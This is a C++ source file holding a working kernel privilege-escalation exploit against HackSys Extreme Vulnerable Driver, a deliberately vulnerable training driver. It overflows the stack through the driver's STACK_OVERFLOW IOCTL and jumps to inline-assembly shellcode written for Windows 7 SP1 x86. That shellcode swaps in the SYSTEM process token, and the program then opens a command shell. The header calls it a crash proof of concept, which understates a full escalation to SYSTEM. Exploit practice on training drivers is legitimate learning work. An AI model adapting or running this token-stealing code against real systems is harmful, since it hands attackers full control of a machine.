// HackSysDriverCrashPoC.cpp : triggers a crash in the HackSys driver via the STACK_OVERFLOW IOCTL
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>
#include <conio.h>

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID
#define EIP_OFFSET 2080 

__declspec(naked) VOID TokenStealingShellcodeWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov edi, [ecx + TOKEN_OFFSET]; Get current process token
			and edx, 0xFFFFFFF8; apply the mask on SYSTEM process token, to remove the referece counter
			and edi, 0x7; apply the mask on the current process token to preserve the referece counter
			add edx, edi; merge AccessToken of SYSTEM with ReferenceCounter of current process
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

			; Kernel Recovery Stub
			xor eax, eax; Set NTSTATUS SUCCEESS
			pop ebp; Restore saved EBP
			ret 8; Return cleanly
	}
}

//Definition taken from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD lpBytesReturned;
	PVOID pMemoryAddress = NULL;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";
	PVOID MemoryAddress = NULL;
	PVOID EopPayload = &TokenStealingShellcodeWin7;
	SIZE_T nInBufferSize = (512 + 9) * sizeof(ULONG); 

   
	printf("Getting the device handle\r\n");

	//HANDLE WINAPI CreateFile( _In_ lpFileName, _In_ dwDesiredAccess, _In_ dwShareMode, _In_opt_ lpSecurityAttributes,
	//_In_ dwCreationDisposition, _In_ dwFlagsAndAttributes, _In_opt_ hTemplateFile );
	HANDLE hDriver = CreateFile(lpDeviceName,           //File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,                   //dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		FILE_SHARE_READ | FILE_SHARE_WRITE,             //dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,                                           //lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,                                  //dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,   //dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);                                          //hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}

	printf("Got the device Handle: 0x%X\r\n", hDriver);
	printf("Allocating Memory For Input Buffer\r\n");

	char* lpInBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);
	
	printf("Input buffer allocated as 0x%X bytes.\r\n", nInBufferSize);
	printf("Input buffer address: 0x%p\r\n", lpInBuffer);
	printf("Filling buffer with A's\r\n");

	RtlFillMemory(lpInBuffer, nInBufferSize, 0x41);
	DWORD* address_field = (DWORD*)(lpInBuffer + EIP_OFFSET);
	*address_field = (DWORD)(EopPayload);

	printf("Buffer ready - sending IOCTL request\r\n");

	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		lpInBuffer,
		nInBufferSize,
		NULL, //No output buffer - we don't even know if the driver gives output #yolo.
		0,
		&lpBytesReturned,
		NULL); //No overlap


	system("cmd.exe");

	printf("IOCTL request completed, cleaning up da heap.\r\n");
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	CloseHandle(hDriver);
	system("pause");
	return 0;
}
